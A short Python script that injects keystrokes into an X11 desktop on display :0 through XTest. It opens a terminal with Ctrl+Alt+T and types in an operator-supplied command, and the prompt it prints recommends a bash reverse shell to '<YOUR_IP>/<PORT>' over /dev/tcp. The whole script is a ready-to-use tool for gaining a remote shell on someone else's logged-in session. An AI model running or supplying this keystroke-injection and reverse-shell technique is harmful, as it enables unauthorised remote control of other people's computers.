import os
import time

from Xlib import X, XK, display
from Xlib.ext import xtest

def setEnvironmentVariables() -> None:
    os.environ["DISPLAY"] = ":0"

def translateKey(d: display.Display, keyName: str) -> int:
    keySym: int = XK.string_to_keysym(keyName)
    if keySym == 0:
        keySym = ord(keyName)
    keyCode = d.keysym_to_keycode(keySym)
    return keyCode

def sendCombination(d: display.Display, keyCodeCombination: list[int]) -> None:
    for keyCode in keyCodeCombination:
        xtest.fake_input(d, X.KeyPress, keyCode)
    d.sync()
    for keyCode in reversed(keyCodeCombination):
        xtest.fake_input(d, X.KeyRelease, keyCode)
    d.sync()

def sendKey(d: display.Display, keyCode: int) -> None:
    xtest.fake_input(d, X.KeyPress, keyCode)
    xtest.fake_input(d, X.KeyRelease, keyCode)
    d.sync()

def sendCommand(d: display.Display, command: str) -> None:
    for ch in command:
        if ch.isupper() or ch in '!@#$%^&*()_+{}|:"<>?~"':
            keyCodeCombination: list[int] = [translateKey(d=d, keyName="Shift_L")]
            keyCodeCombination.append(translateKey(d=d, keyName=ch))
            sendCombination(d=d, keyCodeCombination=keyCodeCombination)
        elif ch == " ":
            keyCode: int = translateKey(d=d, keyName="space")
            sendKey(d=d, keyCode = keyCode)
        else:
            keyCode = translateKey(d=d, keyName=ch)
            sendKey(d=d, keyCode=keyCode)
        time.sleep(0.1)
    keyCode = translateKey(d=d, keyName="Return")
    sendKey(d=d, keyCode=keyCode)

def main() -> None:
    setEnvironmentVariables()
    
    d: display.Display = display.Display()
    
    keyNameCombination: list[str] = [
        "Control_L",
        "Alt_L",
        "t"
    ]
    keyCodeCombination: list[int] = []
    
    for keyName in keyNameCombination:
        keyCodeCombination.append(translateKey(d=d, keyName=keyName))
    
    sendCombination(d=d, keyCodeCombination=keyCodeCombination)
    
    time.sleep(5)
    
    print("Recommended command: bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1")
    command: str = input("Insert command: ")
    
    sendCommand(d=d, command=command)

if __name__ == "__main__":
    main()
